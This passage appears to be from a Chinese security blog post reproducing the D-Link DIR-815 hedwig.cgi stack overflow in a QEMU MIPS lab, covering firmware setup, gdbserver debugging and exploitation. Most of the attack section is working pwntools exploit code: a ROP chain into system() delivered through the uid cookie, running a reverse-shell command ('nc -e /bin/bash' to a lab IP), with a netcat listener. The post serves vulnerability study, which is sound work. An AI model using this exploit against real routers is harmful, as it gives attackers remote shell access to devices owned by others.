<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#init.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">cp http_conf /</span><br><span class="line">cp sbin/httpd /</span><br><span class="line">cp -rf htdocs/ /</span><br><span class="line">mkdir /etc_bak</span><br><span class="line">cp -r /etc /etc_bak</span><br><span class="line">rm /etc/services</span><br><span class="line">cp -rf etc/ /</span><br><span class="line">cp lib/ld-uClibc-0.9.30.1.so  /lib/</span><br><span class="line">cp lib/libcrypt-0.9.30.1.so  /lib/</span><br><span class="line">cp lib/libc.so.0  /lib/</span><br><span class="line">cp lib/libgcc_s.so.1  /lib/</span><br><span class="line">cp lib/ld-uClibc.so.0  /lib/</span><br><span class="line">cp lib/libcrypt.so.0  /lib/</span><br><span class="line">cp lib/libgcc_s.so  /lib/</span><br><span class="line">cp lib/libuClibc-0.9.30.1.so  /lib/</span><br><span class="line">cd /</span><br><span class="line">rm -rf /htdocs/web/hedwig.cgi</span><br><span class="line">rm -rf /usr/sbin/phpcgi</span><br><span class="line">rm -rf /usr/sbin/hnap</span><br><span class="line">ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi</span><br><span class="line">ln -s /htdocs/cgibin /usr/sbin/phpcgi</span><br><span class="line">ln -s  /htdocs/cgibin /usr/sbin/hnap</span><br><span class="line">./httpd -f http_conf</span><br></pre></td></tr></table></figure>

<p>然后就应该可以去访问了</p>
<p><img src="https://s2.loli.net/2025/06/25/owAgE8zf9BLMKqn.png" alt="image" loading="lazy"></p>
<p>可以用nmap去扫描qemu,检测端口是否开放</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.10.67</span><br></pre></td></tr></table></figure>

<h3 id="step4-远程"><a href="#step4-远程" class="headerlink" title="step4 远程"></a>step4 远程</h3><p>需要用到gdbserver</p>
<p>已经编译完成的程序(但是作者好像命名错误了把mipsel打成了mipsle， 所以如果使用这个下面的脚本也需要改一改)</p>
<p><a target="_blank" rel="noopener" href="https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver">https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver</a></p>
<h4 id="远程调试"><a href="#远程调试" class="headerlink" title="远程调试"></a>远程调试</h4><p>qemu &#x2F;root&#x2F;squashfs-root&#x2F;路径下创建run.sh</p>
<p>调试ip地址是虚拟机主机ip</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">export CONTENT_LENGTH=&quot;11&quot;</span><br><span class="line">export CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">export HTTP_COOKIE=&quot;uid=`cat payload`&quot;</span><br><span class="line">export REQUEST_METHOD=&quot;POST&quot;</span><br><span class="line">export REQUEST_URI=&quot;2333&quot;</span><br><span class="line">echo &quot;winmt=pwner&quot; | ./gdbserver 192.168.xx.xx:6666/htdocs/web/hedwig.cgi  </span><br><span class="line">#echo &quot;winmt=pwner&quot; | /htdocs/web/hedwig.cgi</span><br><span class="line">unset CONTENT_LENGTH</span><br><span class="line">unset CONTENT_TYPE</span><br><span class="line">unset HTTP_COOKIE</span><br><span class="line">unset REQUEST_METHOD</span><br><span class="line">unset REQUEST_URI</span><br></pre></td></tr></table></figure>

<p>注：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#echo &quot;winmt=pwner&quot;|./gdbserver.mipsel 192.168.10.60:6666 /htdocs/web/hedwig.cgi</span><br><span class="line"></span><br><span class="line">这一行代码是与gdb-multiarch调试的时候开启。</span><br><span class="line">192.168.10.60 为ubuntu的地址，`6666`是自己设置的连接的端口，直接用gdb-multiarch设置好架构后，用target remote 192.168.10.67:6666连上即可。其中192.168.10.67为qemu的地址。</span><br><span class="line"></span><br><span class="line">------------------------------------</span><br><span class="line"></span><br><span class="line"># echo &quot;winmt=pwner&quot;|/htdocs/web/hedwig.cgi</span><br><span class="line">这行代码是直接生成了payload直接攻击。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>需要将gdbserver.mipsel传入qemu中</p>
<p>然后gdb-multiarch 接过来即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set architecture mips                                     </span><br><span class="line">set follow-fork-mode child  </span><br><span class="line">set detach-on-fork off                                    </span><br><span class="line">target remote 192.168.xx.xxx:6666</span><br><span class="line">file ./htdocs/cgibin                   </span><br></pre></td></tr></table></figure>

<p>file  .&#x2F;file</p>
<p>可以把文件加载到gdb里面获取函数名</p>
<p>qemu虚拟机要获取shell只能去打反弹shell，这里需要运行脚本，gdb-multiarch那边可以接收到我们发送的paylaod</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import requests</span><br><span class="line">context(os = &#x27;linux&#x27;, arch = &#x27;mips&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="line"> </span><br><span class="line">cmd = b&#x27;nc -e /bin/bash 192.168.87.135 8888&#x27; # 这里是Ubuntu物理机的地址</span><br><span class="line"> </span><br><span class="line">libc_base = 0x77f34000</span><br><span class="line"> </span><br><span class="line">payload = b&#x27;a&#x27;*0x3cd</span><br><span class="line">payload += p32(libc_base + 0x53200 - 1) # s0  system_addr - 1</span><br><span class="line">payload += p32(libc_base + 0x169C4) # s1  addiu $s2, $sp, 0x18 (=&gt; jalr $s0)</span><br><span class="line">payload += b&#x27;a&#x27;*(4*7)</span><br><span class="line">payload += p32(libc_base + 0x32A98) # ra  addiu $s0, 1 (=&gt; jalr $s1)</span><br><span class="line">payload += b&#x27;a&#x27;*0x18</span><br><span class="line">payload += cmd</span><br><span class="line"> </span><br><span class="line">url = &quot;http://192.168.87.136:1234/hedwig.cgi&quot; # 这里是qemu虚拟机的地址</span><br><span class="line">data = &#123;&quot;Thir0th&quot; : &quot;pwner&quot;&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;Cookie&quot;        : b&quot;uid=&quot; + payload,</span><br><span class="line">    &quot;Content-Type&quot;  : &quot;application/x-www-form-urlencoded&quot;,</span><br><span class="line">    &quot;Content-Length&quot;: &quot;10&quot;</span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url = url, headers = headers, data = data)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>

<p>.&#x2F;run之后，然后Ubuntu的gdb去连接，然后Ubuntu在开个终端发送exp然后gdb里面就可以收到，这样子调试，反弹shell，还要再开一个终端监听端口，一共需要四个终端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>

<h4 id="远程攻击"><a href="#远程攻击" class="headerlink" title="远程攻击"></a>远程攻击</h4><h5 id="法一：向-QEMU-虚拟机上传-payload"><a href="#法一：向-QEMU-虚拟机上传-payload" class="headerlink" title="法一：向 QEMU 虚拟机上传 payload"></a>法一：向 QEMU 虚拟机上传 payload</h5><p>这种方式我们直接将 payload 写入文件，然后上传到 QEMU 虚拟机，通过设置环境变量来读取 payload 作为 uid，从而触发漏洞反弹 shell</p>
<p>run.sh</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">export CONTENT_LENGTH=&quot;11&quot;</span><br><span class="line">export CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">export HTTP_COOKIE=&quot;uid=`cat payload`&quot;</span><br><span class="line">export REQUEST_METHOD=&quot;POST&quot;</span><br><span class="line">export REQUEST_URI=&quot;2333&quot;</span><br><span class="line">#echo &quot;winmt=pwner&quot; | ./gdbserver 192.168.xx.xx:6666/htdocs/web/hedwig.cgi  </span><br><span class="line">echo &quot;winmt=pwner&quot; | /htdocs/web/hedwig.cgi</span><br><span class="line">unset CONTENT_LENGTH</span><br><span class="line">unset CONTENT_TYPE</span><br><span class="line">unset HTTP_COOKIE</span><br><span class="line">unset REQUEST_METHOD</span><br><span class="line">unset REQUEST_URI</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os = &#x27;linux&#x27;, arch = &#x27;mips&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="line"> </span><br><span class="line">cmd = b&#x27;nc -e /bin/bash 192.168.2.1 8888&#x27;   # 反弹 shell</span><br><span class="line"> </span><br><span class="line">libc_base = 0x77f34000</span><br><span class="line"> </span><br><span class="line">payload = b&#x27;a&#x27;*0x3cd</span><br><span class="line">payload += p32(libc_base + 0x53200 - 1) # s0  system_addr - 1</span><br><span class="line">payload += p32(libc_base + 0x169C4) # s1  addiu $s2, $sp, 0x18 (=&gt; jalr $s0)</span><br><span class="line">payload += b&#x27;a&#x27;*(4*7)</span><br><span class="line">payload += p32(libc_base + 0x32A98) # ra  addiu $s0, 1 (=&gt; jalr $s1)</span><br><span class="line">payload += b&#x27;a&#x27;*0x18</span><br><span class="line">payload += cmd</span><br><span class="line"> </span><br><span class="line">fd = open(&quot;payload&quot;, &quot;wb&quot;)</span><br><span class="line">fd.write(payload)</span><br><span class="line">fd.close()</span><br></pre></td></tr></table></figure>

<p>将生成的payload scp过去</p>
<h5 id="法二：向-httpd-服务发送-HTTP-报文"><a href="#法二：向-httpd-服务发送-HTTP-报文" class="headerlink" title="法二：向 httpd 服务发送 HTTP 报文"></a>法二：向 httpd 服务发送 HTTP 报文</h5><p>‍</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;mips&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">cmd = b&#x27;nc -e /bin/bash 192.168.2.1 8888&#x27;   # 反弹 shell</span><br><span class="line"></span><br><span class="line">libc_base = 0x77f34000</span><br><span class="line"></span><br><span class="line"># 创建 payload</span><br><span class="line">payload = b&#x27;a&#x27; * 0x3cd</span><br><span class="line">payload += p32(libc_base + 0x53200 - 1)  # s0  system_addr - 1</span><br><span class="line">payload += p32(libc_base + 0x169C4)      # s1  addiu $s2, $sp, 0x18 (=&gt; jalr $s0)</span><br><span class="line">payload += b&#x27;a&#x27; * (4 * 7)</span><br><span class="line">payload += p32(libc_base + 0x32A98)      # ra  addiu $s0, 1 (=&gt; jalr $s1)</span><br><span class="line">payload += b&#x27;a&#x27; * 0x18</span><br><span class="line">payload += cmd</span><br><span class="line"></span><br><span class="line"># 定义目标 URL 和数据</span><br><span class="line">url = &quot;http://192.168.2.2:4321/hedwig.cgi&quot;</span><br><span class="line">data = &#123;&quot;winmt&quot;: &quot;pwner&quot;&#125;</span><br><span class="line"></span><br><span class="line"># 定义请求头</span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;Cookie&quot;: b&quot;uid=&quot; + payload,</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,</span><br><span class="line">    &quot;Content-Length&quot;: &quot;11&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 发送 POST 请求</span><br><span class="line">res = requests.post(url=url, headers=headers, data=data)</span><br><span class="line"></span><br><span class="line"># 打印响应</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>

<h2 id="退出仿真环境"><a href="#退出仿真环境" class="headerlink" title="退出仿真环境"></a>退出仿真环境</h2><p>退出是执行fini.sh，要不然下次进去qemu会报错，init.sh脚本已经破坏了根目录，如果忘记的话重新下载内核和镜像</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#fin.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">rm -rf /etc</span><br><span class="line">mv /etc_bak/etc /etc</span><br><span class="line">rm -rf /etc_bak</span><br></pre></td></tr></table></figure>

<p>关于虚拟桥接网络，可以不用去关闭</p>
<p>要关闭的话就这样，但后续配置还需要去配置虚拟桥连网络</p>
<p><img src="https://s2.loli.net/2025/06/25/KJo8Azvmh6uCiwR.png" alt="877a3e4faf9a4c875c3d22c7324239e1" loading="lazy"></p>
<p>参考链接</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/18079">DIR-815 栈溢出漏洞(CNVD-2013-11625)复现-先知社区</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/17924">DIR-815 栈溢出漏洞-先知社区</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44223394/article/details/128756188">从零到一：复现 DIR-815 栈溢出漏洞_dir815漏洞复现-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.uf4te.cn/posts/3fd254db.html#%E6%9F%A5%E7%9C%8B%E8%B7%AF%E7%94%B1%E5%99%A8%E5%B1%9E%E6%80%A7">😘欢迎回来~ | 坠入星野的月🌙</a></p>
<p><a target="_blank" rel="noopener" href="https://zikh26.github.io/posts/d1f081a9.html?highlight=mips#EXP-2">D-Link DIR-815路由器溢出漏洞分析 | ZIKH26&apos;s Blog</a></p>
<p><a target="_blank" rel="noopener" href="https://www.uf4te.cn/posts/c2233a9.html#%E6%B3%95%E4%BA%8C%EF%BC%9A%E5%90%91-httpd-%E6%9C%8D%E5%8A%A1%E5%8F%91%E9%80%81-HTTP-%E6%8A%A5%E6%96%87">CNVD-2013-11625复现 | 坠入星野的月🌙</a></p>
<p>‍</p>
</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">I'm so cute. Please give me money.</div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Thir0th</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://www.thir0th.xyz/2025/06/25/2025-06-25-DIR-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="DIR-815漏洞复现">https://www.thir0th.xyz/2025/06/25/2025-06-25-DIR-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2025/06/28/2025-06-28-%E5%8D%8E%E4%B8%BAHG532RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="prev" title="HG532RCE漏洞复现"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">HG532RCE漏洞复现</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2025/06/11/2025-06-11-20250penHarmonyCTF/" rel="next" title="0penHarmonyCTF-pwn"><span class="post-nav-text">0penHarmonyCTF-pwn</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> Thir0th</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.3.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>